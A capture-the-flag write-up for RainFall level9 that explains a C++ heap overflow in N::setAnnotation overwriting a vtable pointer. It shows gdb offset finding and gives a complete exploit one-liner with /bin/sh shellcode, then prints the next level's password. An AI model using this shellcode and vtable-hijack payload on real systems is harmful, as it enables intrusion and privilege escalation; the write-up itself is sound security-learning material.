Level9
------

1) 
level9@RainFall:~$ ./level9 
level9@RainFall:~$ ./level9 test

The program does nothing visible so we need to analyze it with gdb.

The different from earlier ones because the binary is written in C++, and it uses a class (N) with methods and operator overloading.

2) 

From info functions, the important ones are:

0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)

The key function is: N::setAnnotation(char*)
because it receives a char* (user input) and usually contains the overflow.

Since there are no calls to /bin/sh, we can assume that we will need to inject shellcode in memory and redirect execution to it.


3) 

From the assembly we observe that the program creates two objects of class N using operator new. Each allocation uses a size of 0x6c bytes (108 bytes).

movl $0x6c,(%esp)
call _Znwj
call N::N(int)

The constructor is called with values 5 and 6, meaning two objects are initialized in memory.

4) 

After the objects are created, the program calls setAnnotation() with the user input.

call N::setAnnotation(char*)

This function copies argv[1] into a buffer inside the first object using memcpy(). The important point is that the copy size depends on strlen(argv[1]), meaning there is no size check. Because of this, providing a long input allows us to overflow the first object.

5) 

Since both objects are allocated one after another in memory, overflowing the first object will overwrite the beginning of the second object. In C++, objects that use virtual functions contain a vtable pointer at the beginning of the object. Later in main, the program loads this pointer and calls a function through it.

mov (%eax), %eax
mov (%eax), %edx
call *%edx

This means the program takes the vtable pointer, reads a function pointer, and executes it. If we overwrite the vtable pointer, we can redirect execution.

6) 

To know exactly where the overwrite occurs, we use a cyclic pattern as input and run the program inside gdb.

(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
Starting program: /home/user/level9/level9 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) 

This tells us the program attempted to execute an invalid address because memory was corrupted by our input.


The program crashes. We inspect the registers to see which value was overwritten.

(gdb) info registers eax
eax            0x41366441	1094083649


Using the cyclic pattern we determine that this value appears at offset 108, confirming that the overflow reaches the second object after 108 bytes.

7) 

Next we need to find the address of the buffer containing our input. We set a breakpoint right after the vulnerable setAnnotation() function returns.

(gdb) b *main+136

Then we run the program again with a simple input.

(gdb) run 'AAAA'

When the breakpoint is reached, we inspect the pointer stored in eax.

(gdb) x $eax

Example output: 0x804a00c: 0x41414141

This shows that our input buffer begins at: 0x804a00c

This address will be used in our exploit payload because it points to the memory region we control.

8) 

Since the program dereferences the pointer twice before executing it, we must construct a fake structure. The first 4 bytes will contain the address of our shellcode. Because the shellcode will start right after those 4 bytes, the shellcode address becomes:

0x804a010

So the payload layout becomes:

[shellcode address]
[shellcode]
[padding]
[address of buffer]

Where:

0x0804a010 → address of shellcode

shellcode → code that runs /bin/sh

padding → fills memory until offset 108

0x0804a00c → overwritten vtable pointer

9) The solution


level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ pwd
/home/user/level9
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
